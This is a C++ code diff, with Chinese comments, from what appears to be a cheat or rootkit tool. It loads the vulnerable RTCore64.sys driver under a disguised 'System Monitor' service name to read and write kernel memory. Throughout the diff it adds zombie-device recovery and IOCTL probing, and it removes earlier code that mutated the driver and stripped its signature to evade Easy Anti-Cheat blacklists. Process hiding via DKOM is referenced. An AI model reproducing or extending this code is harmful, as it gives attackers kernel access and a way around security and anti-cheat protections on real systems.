-                if (wcsstr(subKeyName, L"RTCore64Svc") == subKeyName) {
+                // 匹配 RTCore64Svc 或 SysMon 前缀 (历史及当前随机化服务名)
+                bool isStaleSvc = (wcsstr(subKeyName, L"RTCore64Svc") == subKeyName)
+                               || (wcsstr(subKeyName, L"SysMon") == subKeyName);
+                if (isStaleSvc) {
                     std::wstring svcName(subKeyName);
                     // 跳过当前要加载的服务名
                     if (svcName == actualServiceName) { idx++; continue; }
@@ -1055,99 +1216,106 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         }
     }
 
-    // 4. 加载驱动
-    ByovdDiag("BYOVD:Init: loading %ls (path=%ls)\n", actualServiceName.c_str(), actualPath.c_str());
-    if (!LoadDriver(actualServiceName, actualPath)) {
-        // ★ v3.87: STATUS_OBJECT_NAME_COLLISION 回退
-        //   根因: 上次运行 UnloadDriver 缺少 SeLoadDriverPrivilege → NtUnloadDriver 静默失败
-        //         → 驱动残留内核, 注册表被删 → driver object 成为 zombie
-        //   修复: 枚举 \Driver 内核对象目录, 找到 RTCore64 驱动对象, 重建注册表键并卸载
-        ByovdDiag("BYOVD:Init: LoadDriver FAILED for %ls (0xC0000035), scanning \\Driver for zombie...\n",
-            actualServiceName.c_str());
+    // ★ v3.94: 先尝试直接打开已有设备 (可能是 zombie 但仍可用)
+    //   避免 crashy 的 NtOpenDirectoryObject/NtQueryDirectoryObject 枚举
+    ByovdDiag("BYOVD:Init: v3.94 probing for existing device %ls...\n",
+        m_driverInfo.devicePath.c_str());
 
-        // 枚举 \Driver 目录找到所有 RTCore64Svc* 驱动对象
-        struct OBJECT_DIRECTORY_INFORMATION {
-            UNICODE_STRING Name;
-            UNICODE_STRING TypeName;
-        };
+    m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr, OPEN_EXISTING, 0, nullptr);
 
-        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-        if (ntdll) {
-            using NtOpenDirectoryObject_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
-            using NtQueryDirectoryObject_t = NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);
-
-            auto pNtOpenDirectoryObject = (NtOpenDirectoryObject_t)GetProcAddress(ntdll, "NtOpenDirectoryObject");
-            auto pNtQueryDirectoryObject = (NtQueryDirectoryObject_t)GetProcAddress(ntdll, "NtQueryDirectoryObject");
-
-            if (pNtOpenDirectoryObject && pNtQueryDirectoryObject) {
-                UNICODE_STRING dirName;
-                RtlInitUnicodeString(&dirName, L"\\Driver");
-                OBJECT_ATTRIBUTES oa;
-                InitializeObjectAttributes(&oa, &dirName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
-
-                HANDLE hDir = nullptr;
-                if (NT_SUCCESS(pNtOpenDirectoryObject(&hDir, 1 /* DIRECTORY_QUERY */, &oa))) {
-                    std::vector<BYTE> dirBuf(0x10000);
-                    ULONG ctx = 0, retLen = 0;
-                    NTSTATUS querySt;
-
-                    while (NT_SUCCESS(querySt = pNtQueryDirectoryObject(hDir, dirBuf.data(),
-                        (ULONG)dirBuf.size(), FALSE, FALSE, &ctx, &retLen))) {
-                        auto* entry = (OBJECT_DIRECTORY_INFORMATION*)dirBuf.data();
-                        if (entry->Name.Buffer && entry->Name.Length > 0) {
-                            std::wstring objName(entry->Name.Buffer, entry->Name.Length / sizeof(wchar_t));
-                            if (objName.find(L"RTCore64") == 0) {
-                                ByovdDiag("BYOVD:Init: found zombie driver \\Driver\\%ls, unloading...\n",
-                                    objName.c_str());
-
-                                // 重建注册表键 (NtUnloadDriver 需要 registry key 存在)
-                                std::wstring zKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + objName;
-                                HKEY hZKey;
-                                if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, zKeyPath.c_str(),
-                                    0, nullptr, REG_OPTION_NON_VOLATILE,
-                                    KEY_ALL_ACCESS, nullptr, &hZKey, nullptr) == ERROR_SUCCESS) {
-                                    DWORD t=1, st=3, e=1;
-                                    RegSetValueExW(hZKey, L"Type", 0, REG_DWORD, (BYTE*)&t, sizeof(t));
-                                    RegSetValueExW(hZKey, L"Start", 0, REG_DWORD, (BYTE*)&st, sizeof(st));
-                                    RegSetValueExW(hZKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&e, sizeof(e));
-                                    wchar_t ntPath[MAX_PATH * 2];
-                                    swprintf_s(ntPath, L"\\??\\%ls", actualPath.c_str());
-                                    RegSetValueExW(hZKey, L"ImagePath", 0, REG_EXPAND_SZ,
-                                        (BYTE*)ntPath, (DWORD)((wcslen(ntPath) + 1) * sizeof(wchar_t)));
-                                    RegCloseKey(hZKey);
-
-                                    // ★ v3.87: 用找到的真实驱动对象名卸载
-                                    EnablePrivilege(L"SeLoadDriverPrivilege");
-                                    bool unloaded = UnloadDriver(objName);
-                                    ByovdDiag("BYOVD:Init: zombie unload \\Driver\\%ls → %d\n",
-                                        objName.c_str(), (int)unloaded);
-
-                                    RegDeleteTreeW(HKEY_LOCAL_MACHINE, zKeyPath.c_str());
-                                }
-                            }
-                        }
-                        // 检查是否还有更多条目
-                        if (ctx == 0) break;
-                    }
-                    CloseHandle(hDir);
-                    ByovdDiag("BYOVD:Init: \\Driver scan done (status=0x%08X)\n", (uint32_t)querySt);
-                }
+    if (m_hDevice != INVALID_HANDLE_VALUE) {
+        // 设备已存在, 测试 IOCTL 是否可用
+        ByovdDiag("BYOVD:Init: existing device opened, testing IOCTL...\n");
+        m_active = true;
+        m_ntosBase = GetNtoskrnlBase();
+        if (m_ntosBase) {
+            uint16_t magic = 0;
+            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
+            if (probeOk && magic == 0x5A4D) {
+                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX)\n",
+                    (unsigned long long)m_ntosBase);
+                return true;
             }
+            ByovdDiag("BYOVD:Init: existing device IOCTL probe FAILED (magic=0x%04X)\n", magic);
+        }
+        // ★ v3.96: 僵尸设备 — IOCTL 不可用, 设备对象残留但无驱动
+        //   NtMakeTemporaryObject 对文件句柄无效 (需要设备对象句柄),
+        //   NtOpenDirectoryObject 枚举 \Device 目录在 manual-mapped DLL 中会崩溃.
+        //   唯一清理方式: 重启系统.
+        ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
+        CloseHandle(m_hDevice);
+        m_hDevice = INVALID_HANDLE_VALUE;
+        m_active = false;
+    } else {
+        ByovdDiag("BYOVD:Init: no existing device (err=%u), will try to load\n", GetLastError());
+    }
+
+    // 4. 加载驱动
+    // ★ v3.96: 使用原始未修改驱动 + 原始设备名 \\.\RTCore64.
+    //   僵尸设备检测后需重启系统清除, 正常流程通过 Shutdown() 的
+    //   SERVICE_CONTROL_STOP 确保 DriverUnload → IoDeleteDevice 清理.
+    ByovdDiag("BYOVD:Init: loading %ls (path=%ls)\n", actualServiceName.c_str(), actualPath.c_str());
+    bool loadOk = LoadDriver(actualServiceName, actualPath);
+    ByovdDiag("BYOVD:Init: LoadDriver → %d\n", (int)loadOk);
+
+    if (!loadOk) {
+        // ★ v3.95: NtLoadDriver 失败 — 可能是僵尸设备名冲突
+        //   尝试用 DefineDosDeviceW 重建符号链接后打开设备
+        //   从 devicePath (如 \\.\RT64_A1B2) 提取 DOS 名和 NT 设备名
+        std::wstring devPath = m_driverInfo.devicePath;
+        std::wstring dosName, ntDevName;
+        if (devPath.size() > 4 && devPath.substr(0, 4) == L"\\\\.\\") {
+            dosName = devPath.substr(4);                // e.g. "RT64_A1B2"
+            ntDevName = L"\\Device\\" + dosName;        // e.g. "\\Device\\RT64_A1B2"
+        } else {
+            dosName = L"RTCore64";
+            ntDevName = L"\\Device\\RTCore64";
         }
 
-        // 重试加载 (用随机化服务名)
-        ByovdDiag("BYOVD:Init: retrying load %ls...\n", actualServiceName.c_str());
-        if (!LoadDriver(actualServiceName, actualPath)) {
-            ByovdDiag("BYOVD:Init: LoadDriver FAILED for %ls (retry)\n", actualServiceName.c_str());
-            ByovdDiag("BYOVD:Init: trying to open existing device %ls (driver already in kernel)...\n",
-                m_driverInfo.devicePath.c_str());
-            goto try_open_device;
+        ByovdDiag("BYOVD:Init: LoadDriver FAILED, trying symlink fix: '%ls' → '%ls'\n",
+            dosName.c_str(), ntDevName.c_str());
+
+        if (DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosName.c_str(), ntDevName.c_str())) {
+            ByovdDiag("BYOVD:Init: DefineDosDeviceW OK, trying to open...\n");
+            m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
+                GENERIC_READ | GENERIC_WRITE,
+                FILE_SHARE_READ | FILE_SHARE_WRITE,
+                nullptr, OPEN_EXISTING, 0, nullptr);
+            if (m_hDevice != INVALID_HANDLE_VALUE) {
+                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix\n");
+                m_active = true;
+                m_ntosBase = GetNtoskrnlBase();
+                if (m_ntosBase) {
+                    uint16_t magic = 0;
+                    bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
+                    if (probeOk && magic == 0x5A4D) {
+                        ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX)\n",
+                            (unsigned long long)m_ntosBase);
+                        return true;
+                    }
+                    ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
+                }
+                ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                m_active = false;
+            } else {
+                ByovdDiag("BYOVD:Init: still cannot open after symlink fix (err=%u)\n", GetLastError());
+            }
+        } else {
+            ByovdDiag("BYOVD:Init: DefineDosDeviceW FAILED (err=%u)\n", GetLastError());
         }
+
+        ByovdDiag("BYOVD:Init: all attempts failed, giving up\n");
+        UnloadDriver(m_actualServiceName);
+        return false;
     }
     ByovdDiag("BYOVD:Init: LoadDriver OK\n");
 
-    // 4. 打开设备 (新加载或复用已存在)
-try_open_device:
+    // 5. 打开设备
     m_hDevice = CreateFileW(m_driverInfo.devicePath.c_str(),
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -1159,8 +1327,23 @@ try_open_device:
         UnloadDriver(m_actualServiceName);
         return false;
     }
-    ByovdDiag("BYOVD:Init: device opened OK (reused=%d)\n",
-        m_actualServiceName.empty() ? 1 : 0);
+    ByovdDiag("BYOVD:Init: device opened OK\n");
+
+    // ★ v3.98: 探测正确的 IOCTL 码和格式
+    {
+        uint8_t* testVA = nullptr;
+        uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, &testVA);
+        if (probedIoctl == 0) {
+            ByovdDiag("BYOVD:Init: IOCTL probe FAILED — no working IOCTL found\n");
+            CloseHandle(m_hDevice);
+            m_hDevice = INVALID_HANDLE_VALUE;
+            UnloadDriver(m_actualServiceName);
+            return false;
+        }
+        ByovdDiag("BYOVD:Init: IOCTL probe OK — using ioctl=0x%08X (was 0x%08X)\n",
+                  probedIoctl, m_driverInfo.ioctlCode);
+        m_driverInfo.ioctlCode = probedIoctl; // 更新为实际可用的 IOCTL 码
+    }
 
     m_active = true;
     m_ntosBase = GetNtoskrnlBase();
@@ -1187,14 +1370,41 @@ try_open_device:
 }
 
 void KernelMemoryAccessor::Shutdown() {
-    // ★ v3.87: NtUnloadDriver 需要 SeLoadDriverPrivilege
+    // ★ v3.96: 先发送 SERVICE_CONTROL_STOP 触发 DriverUnload → IoDeleteDevice,
+    //   再 NtUnloadDriver 彻底卸载。仅 NtUnloadDriver 可能不会触发 Unload 例程,
+    //   导致 \Device\RTCore64 设备对象残留 (僵尸设备)。
     EnablePrivilege(L"SeLoadDriverPrivilege");
     m_active = false;
     m_pageTableWalker.reset();
     g_physMappings.clear();
 
-    // v3.24: 先卸载驱动再关闭句柄, 避免 CloseHandle 期间 IOCTL 竞态
     if (!m_actualServiceName.empty()) {
+        // ★ v3.96: SCM STOP → 触发驱动 Unload 例程 → IoDeleteDevice
+        SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr,
+            SC_MANAGER_CONNECT);
+        if (hSCM) {
+            SC_HANDLE hSvc = OpenServiceW(hSCM, m_actualServiceName.c_str(),
+                SERVICE_STOP | SERVICE_QUERY_STATUS);
+            if (hSvc) {
+                SERVICE_STATUS svcStatus;
+                if (ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus)) {
+                    ByovdDiag("BYOVD:Shutdown: SERVICE_CONTROL_STOP sent, waiting...\n");
+                    for (int wait = 0; wait < 30; wait++) {
+                        if (!QueryServiceStatus(hSvc, &svcStatus)) break;
+                        if (svcStatus.dwCurrentState == SERVICE_STOPPED) break;
+                        Sleep(100);
+                    }
+                    ByovdDiag("BYOVD:Shutdown: service state=%u\n", svcStatus.dwCurrentState);
+                } else {
+                    ByovdDiag("BYOVD:Shutdown: ControlService FAILED (err=%u)\n", GetLastError());
+                }
+                CloseServiceHandle(hSvc);
+            } else {
+                ByovdDiag("BYOVD:Shutdown: OpenService FAILED (err=%u)\n", GetLastError());
+            }
+            CloseServiceHandle(hSCM);
+        }
+        // NtUnloadDriver 作为兜底
         UnloadDriver(m_actualServiceName);
     }
     if (m_hDevice != INVALID_HANDLE_VALUE) {
@@ -1659,6 +1869,13 @@ bool DKOMProcessHider::UnhideProcess() {
 //       EAC 黑名单按固定签名/哈希匹配 → 失效
 // ============================================================
 static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original) {
+    // ★ v3.96: 不再修改驱动二进制 — 任何 PE 修改 (设备名补丁/签名剥离/时间戳)
+    //   都会触发 Windows 内核的 STATUS_INVALID_IMAGE_HASH (0xC0000428)。
+    //   改为使用原始未修改驱动 + 原始设备名 \\.\RTCore64,
+    //   通过 SCM 清理 + DefineDosDeviceW 修复僵尸设备来避免冲突。
+    //
+    //   仅随机化服务名 (注册表唯一性), 驱动内容保持原样。
+
     // 生成 4 位随机 hex 标识符
     WORD seed = (WORD)(GetTickCount() ^ (GetCurrentProcessId() & 0xFFFF) ^ GetCurrentThreadId());
     wchar_t randomHex[16] = {};
@@ -1672,153 +1889,82 @@ static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original)
     GetTempPathW(MAX_PATH, tempPath);
     wcscat_s(tempPath, randomName);
 
-    // 复制原始驱动文件到临时目录
-    std::wstring srcPath;
-    {
-        wchar_t sysDir[MAX_PATH];
-        GetSystemDirectoryW(sysDir, MAX_PATH);
-        wcscat_s(sysDir, L"\\drivers\\");
-        wcscat_s(sysDir, original.driverPath.c_str());
-
-        // 检查源文件是否存在
-        if (GetFileAttributesW(sysDir) == INVALID_FILE_ATTRIBUTES) {
-            // 回退: 用原始路径 (可能是嵌入提取的路径)
-            srcPath = original.driverPath;
-        } else {
-            srcPath = sysDir;
-        }
+    // ★ 获取嵌入的原始驱动数据 (完全不修改)
+    const uint8_t* embedData = nullptr;
+    size_t embedSize = 0;
+    if (original.driverPath == L"RTCore64.sys") {
+        embedData = stealth::embedded::RTCore64_data;
+        embedSize = stealth::embedded::RTCore64_size;
     }
+    ByovdDiag("BYOVD:Mutate: embedData=0x%p embedSize=%zu\n", embedData, embedSize);
 
-    // 读入整个源驱动到内存 (使用 Win32 API, Unicode 路径兼容)
-    HANDLE hSrc = CreateFileW(srcPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
-        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hSrc == INVALID_HANDLE_VALUE) return original;
-    DWORD fileSize = GetFileSize(hSrc, nullptr);
-    if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
-    std::vector<uint8_t> driverData(fileSize);
-    DWORD bytesRead = 0;
-    ReadFile(hSrc, driverData.data(), fileSize, &bytesRead, nullptr);
-    CloseHandle(hSrc);
-    if (bytesRead != fileSize) return original;
-
-    if (driverData[0] != 'M' || driverData[1] != 'Z') return original; // 不是有效 PE
-
-    // PE 头变异: 修改 Timestamp (偏移 3C→PE sig→offset+8)
-    uint32_t peOffset = *(uint32_t*)(driverData.data() + 0x3C);
-    if (peOffset + 8 + 4 <= fileSize) {
-        // Timestamp 在 PE signature + 8 处
-        uint32_t* pTimestamp = (uint32_t*)(driverData.data() + peOffset + 8);
-        // 随机化为 2024-2025 之间的时间戳
-        *pTimestamp = 0x66000000 | (rand() & 0xFFFFFF);
-    }
-
-    // CheckSum 清零 (在 Optional Header 中, 位置因 PE32/PE32+ 而异)
-    // 为简化, 直接清零 PE signature+88 (CheckSum 对 PE32+ 的位置)
-    if (peOffset + 88 + 4 <= fileSize) {
-        uint32_t* pCheckSum = (uint32_t*)(driverData.data() + peOffset + 88);
-        *pCheckSum = 0;
-    }
-
-    // v3.34: 深层 PE 变异 — 随机化节区名
-    {
-        uint16_t numSections = *(uint16_t*)(driverData.data() + peOffset + 6);
-        auto* ntOpt = (IMAGE_OPTIONAL_HEADER64*)(driverData.data() + peOffset + 24);
-        auto* sections = (IMAGE_SECTION_HEADER*)(driverData.data() + peOffset + sizeof(IMAGE_NT_HEADERS64));
-        WORD optMagic = *(WORD*)(driverData.data() + peOffset + 24);
-
-        SIZE_T firstSecOffset = peOffset + 24;
-        if (optMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
-            firstSecOffset += sizeof(IMAGE_OPTIONAL_HEADER64);
-        else
-            firstSecOffset += sizeof(IMAGE_OPTIONAL_HEADER32);
-        auto* secHdrs = (IMAGE_SECTION_HEADER*)(driverData.data() + firstSecOffset);
-
-        for (int s = 0; s < numSections && (uintptr_t)(secHdrs + s) < (uintptr_t)(driverData.data() + fileSize - sizeof(IMAGE_SECTION_HEADER)); s++) {
-            // 随机化节区名 (8字符, 保留NULL终止)
-            static const char secChars[] = ".abcdefghijklmnopqrstuvwxyz_";
-            for (int c = 0; c < 7; c++) {
-                secHdrs[s].Name[c] = secChars[rand() % (sizeof(secChars) - 1)];
-            }
-            secHdrs[s].Name[7] = '\0';
-        }
-    }
-
-    // v3.34: 填充节区间隙为随机字节 (消除固定0填充特征)
-    {
-        uint16_t numSections = *(uint16_t*)(driverData.data() + peOffset + 6);
-        WORD optMagic = *(WORD*)(driverData.data() + peOffset + 24);
-        SIZE_T firstSecOffset = peOffset + 24;
-        if (optMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
-            firstSecOffset += sizeof(IMAGE_OPTIONAL_HEADER64);
-        else
-            firstSecOffset += sizeof(IMAGE_OPTIONAL_HEADER32);
-        auto* secHdrs = (IMAGE_SECTION_HEADER*)(driverData.data() + firstSecOffset);
-
-        for (int s = 0; s + 1 < numSections && s < 32; s++) {
-            SIZE_T secEnd = secHdrs[s].PointerToRawData + secHdrs[s].SizeOfRawData;
-            SIZE_T nextStart = secHdrs[s + 1].PointerToRawData;
-            if (secEnd < nextStart && nextStart <= fileSize) {
-                for (SIZE_T gap = secEnd; gap < nextStart; gap++) {
-                    driverData[gap] = (uint8_t)(rand() & 0xFF);
-                }
+    if (!embedData || embedSize == 0 || embedSize > 100 * 1024 * 1024) {
+        ByovdDiag("BYOVD:Mutate: no embedded data, falling back to file system\n");
+        // 回退到文件系统
+        std::wstring srcPath;
+        {
+            wchar_t sysDir[MAX_PATH];
+            GetSystemDirectoryW(sysDir, MAX_PATH);
+            wcscat_s(sysDir, L"\\drivers\\");
+            wcscat_s(sysDir, original.driverPath.c_str());
+            if (GetFileAttributesW(sysDir) == INVALID_FILE_ATTRIBUTES) {
+                srcPath = original.driverPath;
+            } else {
+                srcPath = sysDir;
             }
         }
-    }
+        HANDLE hSrc = CreateFileW(srcPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hSrc == INVALID_HANDLE_VALUE) return original;
+        DWORD fileSize = GetFileSize(hSrc, nullptr);
+        if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
+        std::vector<uint8_t> driverData(fileSize);
+        DWORD bytesRead = 0;
+        ReadFile(hSrc, driverData.data(), fileSize, &bytesRead, nullptr);
+        CloseHandle(hSrc);
+        if (bytesRead != fileSize) return original;
 
-    // v3.34: 剥离 Authenticode 数字签名
-    //   DataDirectory[4] = IMAGE_DIRECTORY_ENTRY_SECURITY
-    //   PE 签名字段 (VirtualAddress=文件偏移, Size=签名大小)
-    //   清零该目录项 + 截断文件 → EAC 无法按证书 Subject 白名单匹配
-    {
-        WORD optMagic = *(WORD*)(driverData.data() + peOffset + 24);
-        DWORD certDirOffset = peOffset + 24;
-        // DataDirectory 在 OptionalHeader 最后 128 字节 (16×8)
-        // PE32+: OptionalHeader=240, DataDir起始偏移=240-128=112
-        // PE32:  OptionalHeader=224, DataDir起始偏移=224-128=96
-        if (optMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
-            certDirOffset += sizeof(IMAGE_OPTIONAL_HEADER64) - 128;
-        else
-            certDirOffset += sizeof(IMAGE_OPTIONAL_HEADER32) - 128;
-
-        // DataDirectory[4] = index 4, each entry = 8 bytes (VA + Size)
-        DWORD dirIdx = certDirOffset + (4 * 8);
-        if (dirIdx + 8 <= fileSize) {
-            DWORD certVA  = *(DWORD*)(driverData.data() + dirIdx);
-            DWORD certSz  = *(DWORD*)(driverData.data() + dirIdx + 4);
-            if (certVA > 0 && certSz > 0 && certVA + certSz <= fileSize) {
-                // 清零 DataDirectory[4] 条目
-                *(DWORD*)(driverData.data() + dirIdx) = 0;
-                *(DWORD*)(driverData.data() + dirIdx + 4) = 0;
-                // 缩短文件: 只保留签名前的部分
-                fileSize = certVA;
-                driverData.resize(fileSize);
-            }
+        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
+            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hOut == INVALID_HANDLE_VALUE) return original;
+        DWORD bytesWritten = 0;
+        WriteFile(hOut, driverData.data(), fileSize, &bytesWritten, nullptr);
+        CloseHandle(hOut);
+        if (bytesWritten != fileSize) return original;
+    } else {
+        // 直接写入原始嵌入数据 (不做任何修改)
+        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
+            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hOut == INVALID_HANDLE_VALUE) return original;
+        DWORD bytesWritten = 0;
+        WriteFile(hOut, embedData, (DWORD)embedSize, &bytesWritten, nullptr);
+        CloseHandle(hOut);
+        if (bytesWritten != embedSize) {
+            ByovdDiag("BYOVD:Mutate: WriteFile FAILED (wrote %u/%zu)\n", bytesWritten, embedSize);
+            return original;
         }
+        ByovdDiag("BYOVD:Mutate: wrote original driver %u bytes to %ls\n", bytesWritten, tempPath);
     }
-
-    // 写入变异后的驱动文件
-    HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
-        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hOut == INVALID_HANDLE_VALUE) return original;
-    DWORD bytesWritten = 0;
-    WriteFile(hOut, driverData.data(), fileSize, &bytesWritten, nullptr);
-    CloseHandle(hOut);
-    if (bytesWritten != fileSize) return original;
 
     if (GetFileAttributesW(tempPath) == INVALID_FILE_ATTRIBUTES) return original;
 
-    // 构建随机化的驱动信息
+    // 构建驱动信息: 使用原始设备名 \\.\RTCore64 (驱动内部硬编码),
+    //   仅服务名随机化以避免注册表冲突
     BYOVDDriverInfo mutated;
-    mutated.devicePath = original.devicePath; // 设备路径不变 (驱动内部创建)
+    mutated.devicePath = original.devicePath;     // ★ 保持原始 \\.\RTCore64
+    mutated.ioctlCode = original.ioctlCode;
+    mutated.needsMemoryMap = original.needsMemoryMap;
+    mutated.driverPath = tempPath;
+
     wchar_t svcName[64] = {};
     wsprintfW(svcName, L"SysMon%s", randomHex);
     mutated.serviceName = svcName;
     wchar_t dspName[64] = {};
     wsprintfW(dspName, L"System Monitor %s", randomHex);
     mutated.displayName = dspName;
-    mutated.driverPath = tempPath;         // 使用变异后的临时文件
-    mutated.ioctlCode = original.ioctlCode;
-    mutated.needsMemoryMap = original.needsMemoryMap;
+
+    ByovdDiag("BYOVD:Mutate: device=%ls svc=%ls path=%ls\n",
+        mutated.devicePath.c_str(), mutated.serviceName.c_str(), mutated.driverPath.c_str());
 
     return mutated;
 }
@@ -1850,7 +1996,9 @@ KernelDefense::Result KernelDefense::EnableAll() {
         ByovdDiag("BYOVD: trying driver[%d/%d] = %ls ...\n", ci+1, candCount, drvName);
 
         BYOVDDriverInfo mutated = MutateAndRandomizeDriver(*cand);
+        ByovdDiag("BYOVD:EnableAll: calling Initialize...\n");
         result.driverLoaded = kma.Initialize(mutated);
+        ByovdDiag("BYOVD:EnableAll: Initialize returned %d\n", (int)result.driverLoaded);
 
         if (result.driverLoaded) {
             ByovdDiag("BYOVD: SUCCESS with %ls\n", drvName);
